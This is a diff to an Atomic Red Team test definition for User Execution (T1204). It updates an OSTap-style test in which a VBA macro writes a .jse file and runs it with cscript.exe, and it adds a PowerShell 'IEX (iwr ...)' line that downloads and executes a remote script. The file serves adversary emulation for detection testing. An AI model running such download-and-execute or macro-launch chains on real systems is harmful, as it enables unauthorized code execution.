@@ -3,10 +3,12 @@ attack_technique: T1204
 display_name: User Execution
 
 atomic_tests:
-- name: OSTap Style Macro Delivery
+- name: OSTap Style Macro Execution
   description: |
-    This test uses a COM object to emulate OSTap style Microsoft Office VBS Macro execution.
-    The COM object allows the test to execute without a .docm or .xlsm file dependency
+    This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. The .jse file in turn launches wscript.exe.
+    Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+    
+    This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns 
     References:
       https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader
 
@@ -44,7 +46,7 @@ atomic_tests:
     name: powershell
     elevation_required: false
     command: |
-      Import-Module PathToAtomicsFolder\..\execution-frameworks\Invoke-AtomicRedTeam\Invoke-AtomicRedTeam\Public\Invoke-MalDoc.ps1
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
       $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
       Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
     cleanup_command: |
